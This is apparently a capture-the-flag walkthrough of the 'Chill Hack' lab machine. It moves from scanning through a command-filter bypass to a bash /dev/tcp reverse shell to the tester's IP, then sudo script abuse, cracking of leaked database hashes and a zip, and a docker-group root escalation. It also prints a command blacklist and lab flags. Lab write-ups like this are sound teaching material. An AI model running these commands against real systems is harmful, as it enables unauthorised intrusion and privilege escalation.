> Chill Hack

**export IP=10.10.162.118**

# Nmap 

sudo nmap -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.107.21
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 7EEEA719D1DF55D478C68D9886707F17
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
```

# Gobuster

sudo gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x .txt,.php,.html,.js,.bak,.tar,.zip,.cgi -o gobuster/initial

```
/about.html (Status: 200)
/contact.html (Status: 200)
/contact.php (Status: 200)
/news.html (Status: 200)
/images (Status: 301)
/blog.html (Status: 200)
/index.html (Status: 200)
/css (Status: 301)
/team.html (Status: 200)
/js (Status: 301)
/fonts (Status: 301)
/secret (Status: 301)
```

# FTP - Anonymous login

note.txt

```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

And in /secret directory we can execute certain commands like whoami. And from the above note we have to bypass the filter here and gain a reverse shell.

Looking at some writeups, we can bypass these types after a command which isn't blacklisted and followed by ;.

```
echo "";bash -c "bash -i >& /dev/tcp/10.8.107.21/1234 0>&1"
```

And we are in as www-data.

Running linpeas we got a hit.

sudo -l

```
User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

# .helpline.sh

```
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

Looks like the inputs are passed as such and can be accessed by appar user without password.

```
Let's try running the script as apaar.

sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: in
in
Hello user! I am in,  Please enter your message: /bin/bash
/bin/bash
```

We are in as apaar!! We got the user flag!!

And here looking at index.php show what commands were restricted in that command box.

```
$cmd = $_POST['command'];
$store = explode(" ",$cmd);
$blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
```

# local.txt

```
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

# Some more Enumeration

Running Linpeas we got some info. But befor that let's take a look at /var/www. We got files directory.

We got three php files `hacker.php`, `account.php` and `index.php`.

# index.php

```
$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
```

And we got some creds. here. Can't login through SSH so let's move on to mysql.

1. show databases;

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webportal          |
+--------------------+
```

2. use webportal;
3. show tables;

```
+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+
```

4. use tables;
5. select * from users;

```
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+
```

Putting it in crackstation we can crack the hashes of both.

## CREDENTIALS

```
Anurodh:masterpassword
Apaar:dontaskdonttell
```

Let's login as anurodh! Couldn't!!! Maybe these are rabbit holes!

In /var/www/files we din't check the images directory. So let's check it and downloading the image we can use steghide and find `backup.zip`. But it's password protected.

# fcrackzip

fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' backup.zip

```
PASSWORD FOUND!!!!: pw == pass1word
```

We got source_code.php. Looking at it we come across a base64 password and it's anurodh's.

# CREDENTIALS

`anurodh`:`!d0ntKn0wmYp@ssw0rd`

We are finally in as anurodh!!

# Privilege Escalation

And he is in docker group!

id

```
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```

Let's abuse it using GTFO bins.

`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

And we are root!! And the root flag is there as `proof.txt`

# root.txt

```
{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
```